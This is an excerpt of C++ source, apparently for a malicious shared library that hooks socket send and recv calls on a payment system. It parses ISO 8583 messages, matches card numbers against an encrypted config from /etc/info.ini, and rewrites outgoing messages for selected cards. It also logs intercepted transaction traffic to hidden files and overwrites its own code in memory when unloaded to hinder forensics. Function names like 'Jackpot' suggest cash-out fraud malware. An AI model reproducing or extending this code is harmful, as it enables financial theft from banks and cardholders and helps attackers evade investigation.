...
ssize_t (*real_send)(int s, const void *buf, size_t len, int flags) = send;
ssize_t (*real_recv)(int s, void *buf, size_t len, int flags) = recv;
...
void writeOp(const std::string& logEntry) {
    try {
        std::ofstream logFile("/var/log/cas/spvmdl.dat", std::ios::app);
        if (logFile.is_open()) {
...
void writeToLog(const std::string& logEntry) {
    try {
        ...
        ss << "[TID:" << tid << "] ";
        ss << logEntry;
        std::ofstream logFile("/var/log/cas/err_" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
...
void sendwrite(const std::string& messageType, const uint8_t* detail, uint16_t len) {
    try {
        pid_t pid = getpid();
        pid_t tid = pthread_self();
        std::ofstream logFile("/var/log/cas/TMPS" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
...
void recvwrite(const std::string& messageType, const uint8_t* detail, uint16_t len) {
    try {
        pid_t pid = getpid();
        pid_t tid = pthread_self();
        std::ofstream logFile("/var/log/cas/TMPR" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
            std::stringstream entry;
            entry << getCurrentTimeFormatted() << "[PID:" << pid << "][TID:" << tid << "] " << messageType << " Entry: '";
            for (uint16_t i = 0; i < len; ++i) {
...
void Jackpot(const std::string& logEntry) {
    try {
        ...
        ss << "[TID:" << tid << "] ";
        ss << logEntry;
        std::ofstream logFile("/var/log/cas/spv" + std::to_string(pid) + ".dat", std::ios::app);
        if (logFile.is_open()) {
            logFile << ss.str() << std::endl;
            logFile.close();
        }
...
void JackpotD(const std::string& messageType, const uint8_t* detail, uint16_t len) {
    try {
        pid_t pid = getpid();
        pid_t tid = pthread_self();
        std::stringstream entry;
        ...
        encryptAndWriteToFile(message, "/var/log/cas/spc" + std::to_string(pid) + ".dat");
    } catch (const std::exception& e) {
...
void overwriteMemory() {
    try {
        Dl_info dl_info;
        if (dladdr(reinterpret_cast<void*>(overwriteMemory), &dl_info) != 0) {
            void* baseAddress = dl_info.dli_fbase;
            size_t sizeToOverwrite = 10240; 
            long pageSize = sysconf(_SC_PAGESIZE);
            
            uintptr_t pageAlignedBase = reinterpret_cast<uintptr_t>(baseAddress) & ~(pageSize - 1);
            size_t totalSize = (reinterpret_cast<uintptr_t>(baseAddress) + sizeToOverwrite - pageAlignedBase + pageSize - 1) & ~(pageSize - 1);

            if (mprotect(reinterpret_cast<void*>(pageAlignedBase), totalSize, PROT_READ | PROT_WRITE) == 0) {
                memset(reinterpret_cast<void*>(baseAddress), 0, sizeToOverwrite);
                memset(reinterpret_cast<void*>(baseAddress), 0xFF, sizeToOverwrite);
                memset(reinterpret_cast<void*>(baseAddress), 0xAA, sizeToOverwrite);

                mprotect(reinterpret_cast<void*>(pageAlignedBase), totalSize, PROT_READ | PROT_EXEC);
            } else {
                std::cerr << "Failed to change the memory protection" << std::endl;
            }
        } else {
...
void createLogDirectoryIfNotExists() {
    const char* logDir = "/var/log/cas/"; 
    struct stat info;
    if (stat(logDir, &info) != 0) {
        if (errno == ENOENT) {
            if (mkdir(logDir, 0755) != 0) {
                std::cerr << "Failed to create a directory for logs: " << strerror(errno) << std::endl;
            } else {
                std::cout << "The directory for the logs has been created: " << logDir << std::endl;
            }
        } else {
            std::cerr << "Error during directory validation: " << strerror(errno) << std::endl;
        }
    } else if (!(info.st_mode & S_IFDIR)) {
        std::cerr << logDir << " is not a directory!" << std::endl;
    }
}
void checkPan(int s, uint8_t* recvBuf, uint16_t recvSize) {
    ...
    if (panIter != infoMap.end()) {
        ...
        if (DL_ISO8583_MSG_Pack(&isoHandler, &isoMsg, recvBuf, &packedSize) != DL_ISO8583_MSG_OK) {
            close(sockfd);
            std::lock_guard<std::mutex> logLock(errlog);
...
void checkSend(int s, const uint8_t* sendBuf, uint16_t sendSize) {
    ...
    if (panIter != infoMap.end()) {
        ...
        if (blkIter != blkMap.end()) {
            ...
            DL_ISO8583_MSG_Pack(&isoHandler, &isoMsg, const_cast<uint8_t*>(sendBuf), &packedSize);
...
void logIncomingTraffic(int s, const uint8_t* buf, uint16_t len) {
    ...
    char filename[128];
    snprintf(filename, sizeof(filename), "/var/log/cas/TMPC_%s_%d.tmp", globalIP.c_str(), globalPort);
...
void logOutgoingTraffic(int s, const uint8_t* buf, uint16_t len) {
    sockaddr_in senderAddr;
    socklen_t senderAddrLen = sizeof(senderAddr);
    getpeername(s, (sockaddr*)&senderAddr, &senderAddrLen);
    std::lock_guard<std::mutex> lock(globalMutex);
    ...
    char filename[128];
    snprintf(filename, sizeof(filename), "/var/log/cas/TMPG_%s_%d.tmp", ipStr.c_str(), port);
    std::ofstream file(filename, std::ios::app | std::ios::binary);
    if (file.is_open()) {
...
ssize_t hooked_send(int s, const void *buf, size_t len, int flags) {
    ...
    uint16_t sendSize = len;
    checkSend(s, sendBuf.get(), sendSize);
    sendwrite("SEND", sendBuf.get(), sendSize);
    return real_send(s, sendBuf.get(), sendSize, flags);
}

ssize_t hooked_recv(int s, void *buf, size_t len, int flags) {
...
extern "C" int __attribute__((constructor)) init(void) {
    ...
    if (!real_send || !real_recv) {
        std::cerr << "Error finding symbols" << std::endl;
        return -1;
    }
    createLogDirectoryIfNotExists();
    writeOp("Zaebis");
    auto config = loadEncryptedConfig("/etc/info.ini");
    splitConfig(config, infoMap, blkMap);
    return 0;
}

extern "C" int __attribute__((destructor)) fini(void) {
    writeOp("oxyeno");
    overwriteMemory();
    return 0;
}
